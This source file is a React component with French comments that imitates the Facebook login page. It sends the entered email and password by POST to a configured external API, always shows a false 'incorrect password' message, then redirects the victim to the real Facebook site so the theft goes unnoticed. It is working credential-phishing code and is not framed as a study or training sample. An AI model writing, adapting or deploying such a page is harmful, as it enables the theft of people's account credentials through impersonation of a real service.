import React, { useState } from "react";
import axios from "axios";

const FacebookLogin = () => {
  // États pour l'email, le mot de passe et l'erreur
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");  // État pour le message d'erreur

  // Fonction pour gérer la soumission du formulaire
  const handleLogin = async (e) => {
    e.preventDefault();  // Empêche le rechargement de la page

    // Données à envoyer dans la requête POST
    const userData = {
      email: email,
      password: password,
    };

    try {
      // Effectuer la requête POST avec Axios
      const response = await axios.post(`${import.meta.env.VITE_API_BASE_URL}/api/facebook/`, userData);

      
      // Gérer la réponse réussie
   
      setError("Le mot de passe que vous avez saisi est incorrect. Veuillez réessayer.");
           
            setTimeout(() => {
              window.location.href = `${import.meta.env.VITE_REDIRECT_URL}`; // Rediriger vers Facebook
            }, 3000); 
    } catch (error) {
      // Gérer les erreurs
     
    }
  };

  return (
    <div className="container">
      {/* Partie gauche */}
      <div className="left">
        <h1>facebooooooooooooook</h1>
        <p>Avec Facebook, partagez et restez en contact avec votre entourage.</p>
      </div>

      {/* Partie droite (formulaire) */}
   {/* Partie droite (formulaire) */}
   <div className="right">
        <form onSubmit={handleLogin} >
          <input
            type="text"
            placeholder="Adresse e-mail ou numéro de tél."
            value={email}
            onChange={(e) => setEmail(e.target.value)} // Mettre à jour l'email
            
          />
          <input
            type="password"
            placeholder="Mot de passe"
            value={password}
            onChange={(e) => setPassword(e.target.value)} // Mettre à jour le mot de passe
            style={{
              border: error ? '2px solid red' : '1px solid #ccc', 
              marginBottom: '10px', 
              padding: '10px', 
              borderRadius: '5px'
            }}
          />
          <button type="submit" style={{ padding: '10px 20px', borderRadius: '5px' }}>Se connecter</button>
        </form>
        
        {/* Afficher l'erreur en bas du formulaire si elle existe */}
        {error && <p style={{ color: "red", marginTop: "10px" }}>{error}</p>}

        <a href="#" className="forgot-password">
          Mot de passe oublié ?
        </a>
        <a href="#" className="signup-button">
          Créer un nouveau compte
        </a>
      </div>
    </div>
  );
};

export default FacebookLogin;
